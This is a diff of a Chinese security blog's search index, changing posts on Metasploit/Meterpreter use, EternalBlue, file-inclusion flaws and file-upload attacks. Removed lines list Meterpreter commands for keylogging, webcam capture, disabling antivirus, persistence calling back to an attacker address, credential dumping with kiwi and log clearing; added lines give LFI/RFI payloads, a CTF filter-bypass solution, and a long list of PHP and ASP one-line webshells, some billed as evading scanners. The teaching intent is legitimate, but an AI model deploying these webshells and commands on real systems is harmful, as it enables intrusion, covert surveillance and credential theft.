-download C:/Users/zm/Downloads/t.txt /root/          	#将目标机的C:/Users/zm/Downloads/t.txt文件下载到/root/目录下
-upload /root/pl1.exe C:/Users/zm/Downloads      		#将/root/pl1.exe上传到目标机的 C:/Users/zm/Downloads 目录下
-getpid             										#查看当前Meterpreter Shell的进程PID
-migrate 1384        									#将当前Meterpreter Shell的进程迁移到PID为1384的进程上
-idletime           		 								#查看主机运行时间
-getuid              									#查看获取的当前权限
-getsystem           									#提权,获得的当前用户是administrator才能成功
-run  killav        			 							#关闭杀毒软件
-screenshot          									#截图
-webcam_list         									#查看目标主机的摄像头
-webcam_snap         									#拍照
-webcam_stream       									#开视频
-execute 参数 -f 可执行文件   							    #执行可执行程序
-run getgui -u test1 -p Abc123456    					#创建test1用户，密码为Abc123456
-run getgui -e                							#开启远程桌面
-keyscan_start                							#开启键盘记录功能
-keyscan_dump                			 				#显示捕捉到的键盘记录信息
-keyscan_stop                 							#停止键盘记录功能
-uictl  disable  keyboard     							#禁止目标使用键盘
-uictl  enable   keyboard     							#允许目标使用键盘
-uictl  disable  mouse        							#禁止目标使用鼠标
-uictl  enable   mouse        							#允许目标使用鼠标
-load                        							#使用扩展库
-run				             							#使用扩展库
-run post/windows/wlan/wlan_profile                      #用于读取目标主机WiFi密码
-run exploit/windows/local/persistence lhost=X.X.X.X     #实现永久加载木马
-run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888        #会自动连接192.168.100.132的8888端口，缺点是容易被杀毒软件查杀
-portfwd add -l 9999 -r 192.168.100.158 -p 3389     		                      #将192.168.11.13的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址
-clearev                                                 #清除日志
-</code></pre>
-<p>16、进入shell输入<code>systeminfo</code>查看目标主机信息<br><img src="/posts/1051313787/14.png"><br><br></p>
-<h2 id="利用-ms17-010（永恒之蓝）攻击"><a href="#利用-ms17-010（永恒之蓝）攻击" class="headerlink" title="利用 ms17_010（永恒之蓝）攻击"></a>利用 ms17_010（永恒之蓝）攻击</h2><p>17、在kali终端输入msfconsole进入Metasploit<br><img src="/posts/1051313787/15.png"><br><br></p>
-<p>18、搜索ms17_010漏洞，找到四个模块，前两个是漏洞利用模块，后两个是辅助模块<br><img src="/posts/1051313787/16.png"><br><br></p>
-<p>19、输入use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010(或者输入use 3)使用Auxiliary辅助探测模块对漏洞进行探测；<br>输入show options查看这个模块需要配置的信息<br><img src="/posts/1051313787/17.png"><br><br></p>
-<p>20、设定好扫描192.168.225.100到192.168.225.200<br><code>注：RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞</code><br>发现192.168.225.136主机存在永恒之蓝漏洞（我先前打开了一个有该漏洞的虚拟机在同一网段）<br><img src="/posts/1051313787/18.png"></p>
-<p><img src="/posts/1051313787/19.png"></p>
-<p><img src="/posts/1051313787/20.png"><br><br></p>
-<p>21、使用exploit模块漏洞进行攻击<br><img src="/posts/1051313787/21.png"><br><br></p>
-<p>22、设置攻击载荷和必要参数，输入exploit进行攻击，攻击成功！<br><img src="/posts/1051313787/22.png"></p>
-<p><img src="/posts/1051313787/23.png"><br><br></p>
-<p>23、输入getuid查看当前权限，得知当前是最高权限<br><img src="/posts/1051313787/24.png"><br><br></p>
-<p>24、接下来是后渗透阶段，尝试上传文件到目标主机：upload 本机路径 上传目标路径<br>上传成功，到目标主机里查看文件确认。<br><img src="/posts/1051313787/25.png"></p>
-<p><img src="/posts/1051313787/26.png"><br><br></p>
-<p>25、非常重要的一步：<strong>实现永久加载木马</strong><code>run exploit/windows/local/persistence lhost=X.X.X.X</code><br><img src="/posts/1051313787/29.png"><br><br></p>
-<h2 id="kiwi模块"><a href="#kiwi模块" class="headerlink" title="kiwi模块"></a>kiwi模块</h2><p>kiwi模块要在system权限下才能使用：<br>    creds_all：列举所有凭据<br>    creds_kerberos：列举所有kerberos凭据<br>    creds_msv：列举所有msv凭据<br>    creds_ssp：列举所有ssp凭据<br>    creds_tspkg：列举所有tspkg凭据<br>    creds_wdigest：列举所有wdigest凭据<br>    dcsync：通过DCSync检索用户帐户信息<br>    dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID<br>    golden_ticket_create：创建黄金票据<br>    kerberos_ticket_list：列举kerberos票据<br>    kerberos_ticket_purge：清除kerberos票据<br>    kerberos_ticket_use：使用kerberos票据<br>    kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令<br>    lsa_dump_sam：dump出lsa的SAM<br>    lsa_dump_secrets：dump出lsa的密文<br>    password_change：修改密码<br>    wifi_list：列出当前用户的wifi配置文件<br>    wifi_list_shared：列出共享wifi配置文件&#x2F;编码</p>
-]]></content>
-      <categories>
-        <category>web攻防</category>
-      </categories>
-      <tags>
-        <tag>web攻防</tag>
-        <tag>工具使用</tag>
       </tags>
   </entry>
   <entry>
@@ -478,21 +450,52 @@ clearev                                                 #清除日志
       </tags>
   </entry>
   <entry>
-    <title>DKdun</title>
-    <url>/posts/2430104760.html</url>
-    <content><![CDATA[<h2 id="高性能服务器解决方案：选择DK盾，选择卓越"><a href="#高性能服务器解决方案：选择DK盾，选择卓越" class="headerlink" title="高性能服务器解决方案：选择DK盾，选择卓越"></a>高性能服务器解决方案：选择DK盾，选择卓越</h2><p>在当今数字化和信息化飞速发展的时代，企业对高性能服务器的需求不断增长。无论是大数据处理、云计算还是企业资源计划（ERP），稳定、高效、安全的服务器都是关键。DK盾致力于为各种规模的企业提供顶级服务器解决方案，以满足您的各类业务需求。</p>
-<h2 id="什么是DK盾？"><a href="#什么是DK盾？" class="headerlink" title="什么是DK盾？"></a>什么是DK盾？</h2><p>DK盾是一家领先的服务器供应商，专注于提供高性能、可靠性突出且安全性极高的服务器设备。我们的产品线涵盖了从入门级到企业级的各种服务器解决方案，适用于不同行业和应用场景。</p>
-<h2 id="主要功能与优势"><a href="#主要功能与优势" class="headerlink" title="主要功能与优势"></a>主要功能与优势</h2><p><strong>高性能硬件配置：</strong>DK盾服务器搭载最新的处理器、超高速内存和先进的存储技术，确保您的应用程序和服务能够快速响应，显著提升工作效率。</p>
-<p><strong>卓越的可靠性：</strong>我们的服务器采用冗余电源、热插拔硬盘和智能管理系统，最大限度地减少宕机时间，确保您的业务持续运转。</p>
-<p><strong>强大的扩展性：</strong>无论是存储扩展还是计算扩展，DK盾服务器都具备灵活的扩展能力，能够轻松应对业务增长带来的挑战。</p>
-<p><strong>严格的安全保障：</strong>DK盾服务器配备了多层次的安全防护机制，包括硬件加密、访问控制和实时监控，全面保障数据安全和隐私。</p>
-<p><strong>绿色节能设计：</strong>我们致力于环保与节能，通过优化服务器能效比，降低能耗和运营成本，同时减少对环境的影响。</p>
-<h2 id="为什么选择DK盾？"><a href="#为什么选择DK盾？" class="headerlink" title="为什么选择DK盾？"></a>为什么选择DK盾？</h2><p>专业的技术支持：DK盾拥有一支经验丰富的技术支持团队，提供7x24小时的技术咨询和故障排除服务，确保您的服务器始终保持最佳状态。</p>
-<p>灵活的解决方案：无论您是中小型企业还是大型企业，我们都能根据您的具体需求提供定制化的服务器解决方案，助您实现业务目标。</p>
-<p>优质的客户体验：从售前咨询到售后服务，DK盾始终以客户为中心，提供全方位的支持和服务，确保每一位客户都能获得满意的体验。</p>
-<p>感兴趣的可以加qq群727077055进行咨询</p>
-<p>111111</p>
+    <title>文件包含漏洞</title>
+    <url>/posts/1082777166.html</url>
+    <content><![CDATA[<h2 id="文件包含概述"><a href="#文件包含概述" class="headerlink" title="文件包含概述"></a>文件包含概述</h2><p>文件包含漏洞是一种常见的 Web 应用程序安全漏洞，是代码注入的一种。它的本质是允许攻击者通过利用应用程序中存在的文件包含功能，向服务器提交恶意代码并执行。文件包含漏洞的发生通常与开发人员未对用户提供的文件路径进行足够验证和过滤有关。  </p>
+<span id="more"></span>
+
+<p>以PHP为例,常用的文件包含函数有以下四种：<br><strong>require()</strong>:找不到被包含的文件会产生致命错误，并停止脚本运行<br><strong>include()</strong>:找不到被包含的文件只会产生警告，脚本继续执行<br>**require_once()**与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含<br>**include_once()**与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含<br><br></p>
+<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>常见伪协议：</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">file:</span><span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="symbol">php:</span><span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="symbol">zlib:</span><span class="comment">// — 压缩流</span></span><br><span class="line"><span class="symbol">data:</span><span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line"><span class="symbol">glob:</span><span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="symbol">phar:</span><span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="symbol">ssh2:</span><span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="symbol">rar:</span><span class="comment">// — RAR</span></span><br><span class="line"><span class="symbol">ogg:</span><span class="comment">// — 音频流</span></span><br><span class="line"><span class="symbol">expect:</span><span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
+
+<p>关于php:&#x2F;&#x2F;filter ，可以参考<code>https://www.anquanke.com/post/id/202510#h3-9</code>  ，写的很详细<br><br></p>
+<h2 id="本地文件包含漏洞（LFI）"><a href="#本地文件包含漏洞（LFI）" class="headerlink" title="本地文件包含漏洞（LFI）"></a>本地文件包含漏洞（LFI）</h2><p>当一个Web应用程序接收到用户输入并将其作为文件路径来包含文件时，如果没有进行适当的验证和清理，就可能被攻击者利用来访问或包含服务器上的其他文件。</p>
+<p>一些常见的敏感目录信息路径:<br><strong>Windows系统:</strong></p>
+<p>C:\boot.ini &#x2F;&#x2F;查看系统版本<br>C:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F;IIS配置文件<br>C:\windows\repair\sam &#x2F;&#x2F;存储Windows系统初次安装的密码<br>C:\ProgramFiles\mysql\my.ini &#x2F;&#x2F;Mysql配置<br>C:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F;MySQL root密码<br>C:\windows\php.ini &#x2F;&#x2F;php配置信息  </p>
+<p><strong>Linux&#x2F;Unix系统:</strong><br>&#x2F;etc&#x2F;password &#x2F;&#x2F;账户信息<br>&#x2F;etc&#x2F;shadow &#x2F;&#x2F;账户密码信息<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache2默认配置文件<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F;虚拟网站配置<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关配置<br>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache配置文件<br>&#x2F;etc&#x2F;my.conf &#x2F;&#x2F;mysql配置文件  </p>
+<p>文件包含一般会指定后缀，这样我们就需要截断来绕过。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&quot;html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在PHP5.2.x中我们可以通过使用%00来截断后面的内容、也可以使用路径长度截断，不过都在php5.3中被修复了。</p>
+<p>payload：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/test.php?name=D:\phpstudy\PHPTutorial\MySQL\my.ini%<span class="number">00</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>利用字符.或者&#x2F;.或者.&#x2F;来截断。系统文件路径长度限制：<code>windows 259个bytes</code>  <code>linux 4096个bytes</code>。</p>
+<p><strong>1、日志文件利用</strong><br>当无法包含文件，或者找不到文件上传入口时，可以考虑利用日志文件</p>
+<br>
+
+<h2 id="远程文件包含漏洞（RFI）"><a href="#远程文件包含漏洞（RFI）" class="headerlink" title="远程文件包含漏洞（RFI）"></a>远程文件包含漏洞（RFI）</h2><p>远程文件包含漏洞允许攻击者通过构造特定的URL或请求参数，使得服务器尝试加载一个远程控制的文件。这通常涉及到PHP的include或require语句，这些语句可以用来包含外部文件。如果这些语句没有得到适当的限制，攻击者就可以利用它们来包含恶意文件，如webshell，这是一种可以远程执行命令的脚本。</p>
+<p>RFI存在的前提是在php.ini中配置<code>allow_url_include</code>、 <code>allow_url_fopen</code>为on。</p>
+<p>对于RFI，我们可以使用?截断，不受版本限制：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/test.php?name=http://<span class="number">127.0.0.1</span>/<span class="number">1</span>.txt?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h2><p>攻防世界—泰山杯-简单的文件包含<br>1、源码如下:<br><img src="/posts/1082777166/1.png"></p>
+<p>2、输入<br><code>http://61.147.171.105:54882/?filename=php://filter/convert.base64-encode/resource=check.php</code> 回显do not hack ,说明在check.php内对代码进行了过滤(使用string.rot13过滤器也不行)<br><img src="/posts/1082777166/2.png"></p>
+<p>3、只能逐个尝试过滤器,过滤器详情可以参考<br><code>https://blog.csdn.net/qq_44657899/article/details/109300335</code><br>这里尝试使用convert.iconv*,得知使用了正确的过滤器,但是应该是字符编码不符合<br><img src="/posts/1082777166/3.png"></p>
+<p>4、于是使用burpsuite抓包对字符编码进行爆破,常见的字符编码如下(不全):</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>*</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>BE</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>LE*</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span></span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span>BE</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span>LE</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>BE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>LE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>BE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>LE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">7</span></span><br><span class="line"><span class="attribute">UTF7</span>-IMAP</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">8</span>*</span><br><span class="line"><span class="attribute">ASCII</span>*</span><br><span class="line"><span class="attribute">EUC</span>-JP*</span><br><span class="line"><span class="attribute">SJIS</span>*</span><br><span class="line"><span class="attribute">eucJP</span>-win*</span><br><span class="line"><span class="attribute">SJIS</span>-win*</span><br><span class="line"><span class="attribute">ISO</span>-<span class="number">2022</span>-JP</span><br><span class="line"><span class="attribute">ISO</span>-<span class="number">2022</span>-JP-MS</span><br><span class="line"><span class="attribute">CP932</span></span><br><span class="line"><span class="attribute">CP51932</span></span><br><span class="line"><span class="attribute">BASE64</span></span><br></pre></td></tr></table></figure>
+<p><img src="/posts/1082777166/4.png"></p>
+<p>5、得知有5种组合方式是有正常回显的,查看响应包,得到check.php的具体内容<br><img src="/posts/1082777166/5.png"></p>
+<p>6、我们选择EUC-JP<em>和UCS-4</em>作为字符编码,构造payload:<br><code>http://61.147.171.105:54882/?filename=php://filter/convert.iconv.EUC-JP*.UCS-4*/resource=check.php</code> ,然后将check.php 改成 flag.php 即可得到flag<br><img src="/posts/1082777166/6.png"></p>
 ]]></content>
+      <categories>
+        <category>web漏洞</category>
+      </categories>
+      <tags>
+        <tag>web攻防</tag>
+        <tag>web漏洞</tag>
+      </tags>
   </entry>
   <entry>
     <title>php序列化和反序列化</title>
@@ -606,73 +609,75 @@ clearev                                                 #清除日志
       </tags>
   </entry>
   <entry>
-    <title>SSRF漏洞</title>
-    <url>/posts/1355767420.html</url>
-    <content><![CDATA[<h1 id="SSRF漏洞定义"><a href="#SSRF漏洞定义" class="headerlink" title="SSRF漏洞定义"></a>SSRF漏洞定义</h1><p>SSRF(<strong>S</strong>erver-<strong>S</strong>ide <strong>R</strong>equest <strong>F</strong>orgery：服务器跨站请求),是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
+    <title>文件上传漏洞</title>
+    <url>/posts/154257042.html</url>
+    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。</p>
 <span id="more"></span>
+<p><strong>一句话木马大全：</strong>(搬运自<a href="https://blog.csdn.net/qq_43390703/article/details/104858705">https://blog.csdn.net/qq_43390703/article/details/104858705</a>)</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">##PHP：</span></span><br><span class="line">注意：限制内容长度时可以将GIF89a换成BM，木马写成<span class="meta">&lt;?=</span>`tac /f*`;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;r00ts&#x27;</span>]);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[cmd]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_REQUEST</span>[cmd]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//?cmd=phpinfo() @preg_replace(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abcd&quot;); ?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?cmd=phpinfo();</span></span><br><span class="line"><span class="variable">$func</span> =<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//?func=system&amp;cmd=whoami</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable">$new_array</span>=<span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="comment">//print_r($new_array);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br><span class="line">@<span class="title function_ invoke__">call_user_func</span>(assert,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&quot;assert&quot;</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?func=system&amp;cmd=whoami</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$func</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">usort</span>(<span class="variable">$_GET</span>,<span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);<span class="meta">?&gt;</span> php环境&gt;=&lt;<span class="number">5.6</span>才能用</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);<span class="meta">?&gt;</span>  php环境&gt;=<span class="number">5.6</span>才能用</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST1</span>);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);&#125;<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_REQUEST1</span>);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> (<span class="variable">$_</span>=@<span class="variable">$_GET1</span>).@<span class="variable">$_</span>(<span class="variable">$_POST1</span>)<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">eval_r</span>(<span class="variable">$_POST1</span>)<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">eval_r</span>(<span class="variable">$_POST1</span>)<span class="meta">?&gt;</span><span class="comment">//容错代码 </span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST1</span>);<span class="meta">?&gt;</span><span class="comment">//使用Lanker一句话客户端的专家模式执行相关的PHP语句 </span></span><br><span class="line"><span class="meta">&lt;?</span><span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>]);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?</span><span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>])<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[email]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;h&#x27;</span>],<span class="string">&quot;error&quot;</span>);<span class="meta">?&gt;</span><span class="comment">/*使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/</span>:&lt;O&gt;h=@<span class="title function_ invoke__">eval_r</span>(<span class="variable">$_POST1</span>);&lt;/O&gt; </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]` <span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="title function_ invoke__">eval_r</span>(<span class="variable">$_POST</span>[sb])&lt;/script&gt; <span class="comment">//绕过&lt;?限制的一句话</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> (])<span class="meta">?&gt;</span>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]))&#123;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);&#125;<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span> (<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span> </span><br><span class="line">加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！</span><br><span class="line"></span><br><span class="line">&lt;%execute <span class="title function_ invoke__">request</span>(“<span class="keyword">class</span>”)%&gt;&lt;%<span class="string">&#x27;&lt;% loop &lt;%:%&gt;&lt;%&#x27;</span>&lt;% loop &lt;%:%&gt;&lt;%execute <span class="title function_ invoke__">request</span> (“<span class="keyword">class</span>”)%&gt;&lt;%execute <span class="title function_ invoke__">request</span>(“<span class="keyword">class</span>”)<span class="string">&#x27;&lt;% loop &lt;%:%&gt; </span></span><br><span class="line"><span class="string">无防下载表，有防下载表可尝试插入以下语句突破的一句话 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;%eval(request(“1″)):response.end%&gt; 备份专用</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="攻击的目标"><a href="#攻击的目标" class="headerlink" title="攻击的目标"></a>攻击的目标</h2><p>从外网无法访问的<strong>内部系统</strong>（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）</p>
-<h2 id="形成的原因"><a href="#形成的原因" class="headerlink" title="形成的原因"></a>形成的原因</h2><p>大多是由于服务端提供了从其他服务器应用<strong>获取数据</strong>的功能，且没有对目标地址做过滤和限制。</p>
-<h2 id="SSRF漏洞危害"><a href="#SSRF漏洞危害" class="headerlink" title="SSRF漏洞危害"></a>SSRF漏洞危害</h2><p>通过服务器A（SSRF服务器）访问A所在内网的其他服务器获取信息，进而利用SSRF实现其他漏洞利用。</p>
-<p>1、利用file协议读取本地文件<br>2、对服务器所在内网、本地进行端口扫描，获取一些服务的banner信息<br>3、攻击运行在内网或本地的应用程序<br>4、对内网web应用进行指纹识别，识别企业内部的资产信息<br>5、攻击内外网的web应用，主要是使用HTTP GET请求就可以实现的攻击  </p>
-<p>SSRF漏洞的利用方式可以分成<strong>两个方向：相关php函数、常利用的相关协议</strong></p>
-<h2 id="相关php函数"><a href="#相关php函数" class="headerlink" title="相关php函数"></a>相关php函数</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">curl_exec</span><span class="params">()</span></span> 用于执行cURL会话，处理复杂的HTTP请求。</span><br><span class="line"><span class="function"><span class="title">fsockopen</span><span class="params">()</span></span> 打开一个网络连接，用于低级别的网络通信</span><br><span class="line"><span class="function"><span class="title">file_get_contents</span><span class="params">()</span></span> 读取文件或URL内容到字符串，简单高效</span><br><span class="line"><span class="function"><span class="title">fopen</span><span class="params">()</span></span> 打开文件或URL，可以用于读写操作</span><br><span class="line"><span class="function"><span class="title">readfile</span><span class="params">()</span></span> 读取文件并直接输出，简单快速</span><br></pre></td></tr></table></figure>
+<h2 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h2><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;form enctype<span class="operator">=</span><span class="string">&quot;multipart/form-data&quot;</span> method<span class="operator">=</span><span class="string">&quot;post&quot;</span> onsubmit<span class="operator">=</span><span class="string">&quot;return checkFile()&quot;</span>&gt;</span><br><span class="line">             &lt;p&gt;请选择要上传的图片：&lt;/p&gt;&lt;p&gt;</span><br><span class="line">             &lt;input class<span class="operator">=</span><span class="string">&quot;input_file&quot;</span> type<span class="operator">=</span><span class="string">&quot;file&quot;</span> name<span class="operator">=</span><span class="string">&quot;upload_file&quot;</span>&gt;</span><br><span class="line">             &lt;input class<span class="operator">=</span><span class="string">&quot;button&quot;</span> type<span class="operator">=</span><span class="string">&quot;submit&quot;</span> name<span class="operator">=</span><span class="string">&quot;submit&quot;</span> value<span class="operator">=</span><span class="string">&quot;上传&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">         &lt;/form&gt;</span><br></pre></td></tr></table></figure>
